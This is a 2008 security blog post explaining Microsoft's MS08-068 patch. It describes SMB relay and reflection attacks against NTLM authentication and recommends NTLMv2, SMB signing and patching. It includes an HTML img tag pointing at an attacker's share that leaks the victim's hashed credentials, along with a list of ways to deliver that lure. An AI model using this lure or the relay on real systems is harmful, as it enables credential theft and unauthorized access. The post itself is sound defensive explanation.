---
id: 110
title: ms08-068 &#8212; Preventing SMBRelay Attacks
date: '2008-11-12T12:38:29-05:00'
author: ron
layout: post
guid: http://www.skullsecurity.org/blog/?p=110
permalink: "/2008/ms08-068-preventing-smbrelay-attacks"
categories:
- hacking
- smb
comments_id: '109638329014031096'

---

Microsoft released ms08-068 this week, which fixes a vulnerability that's been present and documented since 2001. I'm going to write a quick overview of it here, although you'll probably get a better one by reading <a href='http://blog.metasploit.com/2008/11/ms08-067-metasploit-and-smb-relay.html'>The Metasploit Blog</a>. 
<!--more-->
Keep in mind that there is a lot of fun stuff that can be done with the SMB protocol. I'm going to talk about a few different design flaws right now, and point out exactly what ms08-068 patches. Hang on, though, this is going to get somewhat technical. The payoff, however, is that this is incredibly interesting stuff, and I'm happy to clear up any technical confusion. Just leave me a comment or an email! 

I have talked about how <a href='http://www.skullsecurity.org/blog/?p=34'>Lanman and NTLM</a> work (or fail to work) in the past, so I'll assume you've read that and just post a quick overview here. Basically, Lanman and NTLM will hash your password using their respective algorithms (and store the hashes on the system), then hash it again based on the server's 8-byte challenge. This second hash is the same for Lanman and NTLM -- it takes the hash already generated, splits it into three 7-byte chunks (padding it to 21 bytes), and encrypting the server challenge with each of those chunks. If an attacker already has access to the Lanman and NTLM hashes, then the game has already been won (the hashes can be directly used to log in). 

The primary advantage to having a server challenge is to prevent pre-computed attacks (that is, it provides salt-like value to prevent rainbow tables-style precomputation attacks against the algorithm). Naturally, a malicious server can send a known challenge and generate tables based on that. This type of attack has been fixed in NTLMv2 (since the client provides part of the randomness). 

A SMB Relay attack is a type of man-in-the-middle attack where the attacker asks the victim to authenticate to a machine controlled by the attacker, then relays the credentials to the target. The attacker forwards the authentication information both ways, giving him access. Here are the players in this scenario:
<ul>
<li>The <b>attacker</b> is the person trying to break into the target</li>
<li>The <b>victim</b> is the person who has the credentials</li>
<li>The <b>target</b> is the system the attacker wants access to, and that the victim has credentials for</li>
</ul>

And here's the scenario (see the image at the right for a diagram):
<img src='/blogdata/ms08-068-1.png' style='float: right;' />
<ol>
<li>Attacker tricks the victim into connecting to him; this is easy, I'll explain how later</li>
<li>Attacker establishes connection to the target, receives the 8-byte challenge</li>
<li>Attacker sends the 8-byte challenge to victim</li>
<li>Victim responds to the attacker with the password hash</li>
<li>Attacker responds to the target's challenge with the victim's hash</li>
<li>Target grants access to attacker</li>
</ol>

In the case of Metasploit, the attacker goes on to upload and execute shellcode, but that process isn't important, and it's discussed on the Metasploit blog posting. 

Now, as an attacker, we have two problems: the victim needs to initiate a connection to the attacker, and the victim needs to have access to the target. 

The first problem is easy to solve -- to initiate a session, send the user a link that goes to the attacker's machine. For example, send them to a Web site containing the following code:
<pre>&lt;img src="\\Attacker\SHARE\file.jpg"&gt;</pre>

Their browser will attempt to connect to a share on the attacker called "SHARE", during which a session will be established. The victim's machine will automatically send the current credentials, hashed with whatever challenge is sent by the attacker (naturally, for the attack, this is the target's challenge). This can be delivered to them through an email link, through a stored cross-site scripting attack, by vandalizing a site they frequent, redirecting them with DNS poisoning, ARP spoofing, <a href='http://www.skullsecurity.org/blog/?p=6'>NetBIOS poisoning</a>, and any number of other ways. Suffice to say, it's pretty easy to trick the victim into connecting to the attacker. 


The second problem is that the victim needs to have access to the target. This one is slightly more difficult, but it can happen in a number of ways:
<ul>
<li>In a domain scenario, the user's domain account may have access to multiple machines, including the target</li>
<li>In other scenarios, users are well known to synchronize their password between machines. The target may have the same password as the victim, which would make the attack work</li>
<li>The target may be the <i>same physical machine as the victim</i></li>
</ul>

That third point is the interesting one -- this can be used to exploit the computer itself! So, in that scenario, here are the modified steps (see the image at the right, although I think it's probably more confusing :) ):
<img src='/blogdata/ms08-068-2.png' style='float: right;' />
<ol>
<li>Attacker tricks the victim into connecting to him</li>
<li>Attacker establishes connection back to the victim, receives the 8-byte challenge</li>
<li>Attacker sends the victim's 8-byte back</li>
<li>Victim responds to the attacker with the password hash that'll give the attacker access to the victim's own computer</li>
<li>Attacker responds to the victim's challenge with the victim's hash</li>
<li>Victim grants access to attacker</li>
</ol>

Hopefully that isn't too confusing. What it essentially means is that the victim will grant access to the attacker using its own credentials. 

And this particular attack is what ms08-068 patches! 

To put it another way: ms08-068 patches an attack (discovered in 2001) where a victim is tricked into giving an attacker access to connect to itself. 

<h2>Mitigation</h2>
I talked a lot about vulnerabilities in the SMB protocol. Unfortunately, ms08-068 only fixes one of them. The issue is that the others are design flaws and can't be fixed without breaking clients. That being said, even though Microsoft can't fix them, you can fix them yourself, more or less, at the cost of potentially breaking clients (these can be done with local/domain security policies or registry hacks; search for them to find information):
<ul>
<li>Enable (and require) NTLMv2 authentication -- this will prevent pre-computed attacks, because the client provides part of the randomness</li>
<li>Enable (and require) message signing for both clients and servers -- this will prevent relay attacks</li>
<li>Install ms08-068 -- this will prevent a specific subset of relay attacks, where it's relayed back to itself</li>
</ul>

Hope that helps! 

And, as usual, if you have any questions feel free to track me down. 

Ron
